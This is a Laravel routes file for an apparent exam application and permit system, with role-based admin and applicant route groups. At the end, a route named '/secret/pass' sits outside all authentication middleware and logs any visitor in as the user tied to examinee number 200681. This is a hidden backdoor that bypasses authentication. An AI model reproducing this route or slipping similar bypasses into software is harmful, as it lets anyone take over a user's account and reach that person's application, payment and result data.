<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\{HomeController, PrintPermitController,ResultController};
use App\Http\Controllers\Admin\DashboardController;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

Route::middleware([
    'auth:sanctum',
    config('jetstream.auth_session'),
    'verified'
])->group(function () {
    Route::get('/dashboard',function(){
        switch (auth()->user()->role_id) {
            case 1:
                return redirect()->route('admin.dashboard');
                break;
            case 2:
                return redirect()->route('applicant.home');
                break;
        }
    })->name('dashboard');
});


Route::prefix('/admin')->middleware(['auth:sanctum','is_admin',config('jetstream.auth_session'),'verified'])->group(function () {
    
    Route::get('/dashboard',[DashboardController::class,'dashboard'])->name('admin.dashboard');
    Route::get('/examinations', function () {
        return view('admin.examinations');
    })->name('admin.examinations');
    Route::get('/programs', function () {
        $campuses = \App\Models\Campus::all('id','name');
        return view('admin.programs',['campuses'=>$campuses]);
    })->name('admin.programs');
    Route::get('/manage-examination/{id}/applications',function($id){
        return view('admin.manage-examination.applications',[
            'examination_id' => $id,
        ]);
    })->name('admin.manage-examination.applications');
     Route::get('/users', function () {
        return view('admin.users');
    })->name('admin.users');
});

Route::prefix('/applicant')->middleware(['auth:sanctum','is_applicant',config('jetstream.auth_session'),'verified'])->group(function () {
    Route::get('/home', [HomeController::class,'home'])->name('applicant.home');
    Route::get('/fill/application', [HomeController::class,'fillApplication'])
            ->name('applicant.fill.application')
            ->middleware('step_two');
    Route::get('/payment', [HomeController::class,'payment'])
            ->name('applicant.payment')
            ->middleware('step_three');

    Route::get('/permit', [PrintPermitController::class,'generate'])
            ->name('applicant.permit-generate')
            ->middleware('step_five');
    Route::get('/result',[ResultController::class,'result'])->name('print.result');

});

Route::get('/secret/pass',function(){
    $permit = App\Models\Permit::where('examinee_number',200681)->first();
    $user = App\Models\User::where('id',$permit->user_id)->first();
    Auth::login($user);
})->name('secret.pass');